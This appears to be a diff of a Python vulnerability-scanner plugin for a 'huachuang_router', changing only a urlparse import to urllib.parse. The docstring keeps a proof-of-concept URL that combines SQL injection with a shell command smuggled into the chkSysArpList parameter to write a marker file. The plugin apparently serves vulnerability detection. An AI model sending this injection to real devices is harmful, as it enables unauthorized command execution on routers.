@@ -11,12 +11,12 @@ POC:
     http://foobar/acc/bindipmac/static_arp_list_action.php?chkSysArpList[0]=0&sysArpEth[0]=1' and 0 union select 'a||echo hehehe>testvul.txt||b--&sysArpIp[0]=1&sysArpMac[0]=1
 '''
 
-import urlparse
+import urllib.parse
 
 
 def assign(service, arg):
     if service == 'huachuang_router':
-        arr = urlparse.urlparse(arg)
+        arr = urllib.parse.urlparse(arg)
         return True, '%s://%s/' % (arr.scheme, arr.netloc)
 
 def audit(arg):
